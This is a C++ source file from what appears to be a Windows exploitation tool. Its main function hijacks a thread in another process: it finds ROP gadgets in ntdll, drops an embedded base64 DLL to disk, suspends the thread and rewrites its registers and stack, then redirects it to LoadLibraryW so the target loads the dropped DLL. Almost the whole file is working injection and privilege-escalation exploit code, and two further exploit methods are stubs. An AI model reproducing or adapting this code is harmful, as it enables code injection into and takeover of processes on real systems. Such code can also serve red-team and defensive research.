#include "ExploitThread.h"
#include "ElhHelper.h"
#include "ElhROP.h"

bool ExploitThread::exploitAllAccess(HANDLE& hTgt) {
    ElhROP::ROPVars rVars;

    printf("[+] Searching for gadgets in 'NTDLL.DLL'\n");
    if (!ElhROP::findGadgets(GetModuleHandle(L"ntdll.dll"), rVars)) {
        printf("[*] Failed to locate gadgets\n");
        return false;
    }
    printf("\t[JMP Gadget] Found at 0x%llx: %s\n", rVars.dwJMPGadget, rVars.sJMPGadget.c_str());
    printf("\t[MOV Gadget] Found at 0x%llx: %s\n", rVars.dwMOVGadget, rVars.sMOVGadget.c_str());

    std::wstring wsDllPath = ElhHelper::getELHDirectory() + L"\\exploitThread.dll";
    wprintf(L"[+] Writing DLL to '%s'\n", wsDllPath.c_str());

    std::vector<BYTE> bExploitThreadDll = ElhHelper::decodeBase64(exploitThreadDllBase64);
    if (!ElhHelper::writeDataToFile(wsDllPath, bExploitThreadDll)) {
        wprintf(L"[*] Failed to write DLL\n");
        return false;
    }

    PSYSTEM_PROCESS_INFORMATION pProcInfo = nullptr;
    getSystemProcessInformation(pProcInfo);

    printf("[+] Suspending target thread\n");
    SuspendThread(hTgt);

    DWORD dwTID = GetThreadId(hTgt);
    if (!ExploitThread::isThreadReady(pProcInfo, dwTID)) {
        printf("[!] Attempting to race thread for a ready state (UNSTABLE)\n");
        do {
            ResumeThread(hTgt);
            getSystemProcessInformation(pProcInfo);
            SuspendThread(hTgt);
        } while (!(ExploitThread::isThreadReady(pProcInfo, dwTID)));
    }

    printf("[+] Setting thread instruction pointer to JMP gadget and increasing stack pointer\n");
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(hTgt, &ctx);

    rVars.dwStackBase = ctx.Rsp - (32 * sizeof(DWORD64));

    ctx.Rsp = rVars.dwStackBase;
    ctx.Rip = rVars.dwJMPGadget;
    SetThreadContext(hTgt, &ctx);
    ResumeThread(hTgt);
    SuspendThread(hTgt);
    GetThreadContext(hTgt, &ctx);

    printf("[+] Writing JMP gadget to the stack at 0x%llx\n", rVars.dwStackBase + 0x8);
    ElhROP::gadgetWriteQword(ctx, hTgt, rVars.dwJMPGadget, rVars.dwStackBase + 0x8, rVars);

    printf("[+] Writing DLL path to the stack starting at 0x%llx\n", rVars.dwStackBase + 0x48);
    ElhROP::gadgetWriteString(ctx, hTgt, wsDllPath, rVars.dwStackBase + 0x48, rVars);

    printf("[+] Getting address for LoadLibraryW\n");
    DWORD64 dwLoadLibraryAddress = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (dwLoadLibraryAddress == 0) {
        printf("[*] Failed to locate LoadLibraryW : %i\n", GetLastError());
        return -1;
    }

    printf("[+] Directly setting RIP & RCX registers to invoke LoadLibraryW\n");
    // TODO: MOV gadget to RTN => LoadLibrary crashes with 'STATUS_STACK_BUFFER_OVERRUN' (0xC0000409) but this is crude
    ctx.Rip = dwLoadLibraryAddress;
    ctx.Rcx = rVars.dwStackBase + 0x48; // Parameter (DLL Path)
    SetThreadContext(hTgt, &ctx);
    ResumeThread(hTgt);

    return true;
}

bool ExploitThread::exploitDirectImpersonation(HANDLE& hTgt) {
    return false; // TODO
}

bool ExploitThread::exploitSetContext(HANDLE& hTgt) {
    return false; // TODO
}

#pragma region PRIVATE
void ExploitThread::allocProcessInformationSize(PSYSTEM_PROCESS_INFORMATION& pSystemProcessInfo, ULONG ulSystemInfoLength) {
    HANDLE hHeap = GetProcessHeap();
    HeapFree(hHeap, HEAP_NO_SERIALIZE, pSystemProcessInfo);
    pSystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSystemInfoLength);
}

void ExploitThread::getSystemProcessInformation(PSYSTEM_PROCESS_INFORMATION& pSystemProcessInfo) {
    ULONG ulSystemInfoLength = sizeof(SYSTEM_PROCESS_INFORMATION);
    allocProcessInformationSize(pSystemProcessInfo, ulSystemInfoLength);
    NTSTATUS ntStatus;
    while ((ntStatus = NtQuerySystemInformation(SystemProcessInformation, pSystemProcessInfo, ulSystemInfoLength, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        allocProcessInformationSize(pSystemProcessInfo, ulSystemInfoLength *= 2);
    }
}

bool ExploitThread::isThreadReady(PSYSTEM_PROCESS_INFORMATION pProcInfo, DWORD dwTID) {
    while (pProcInfo) {
        PSYSTEM_THREAD_INFORMATION pThreadInfo = pProcInfo->Threads;
        for (ULONG i = 0; i < pProcInfo->NumberOfThreads; ++i, pThreadInfo++) {
            if (pThreadInfo->ClientId.UniqueThread == (HANDLE)dwTID) {
                return (
                    pThreadInfo->ThreadState == KTHREAD_STATE::Initialized ||
                    pThreadInfo->ThreadState == KTHREAD_STATE::Ready ||
                    pThreadInfo->ThreadState == KTHREAD_STATE::Running
                    );
            }
        }
        if (pProcInfo->NextEntryOffset == 0) {
            break;
        }
        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProcInfo + pProcInfo->NextEntryOffset);
    }
    return false;
}
#pragma endregion PRIVATE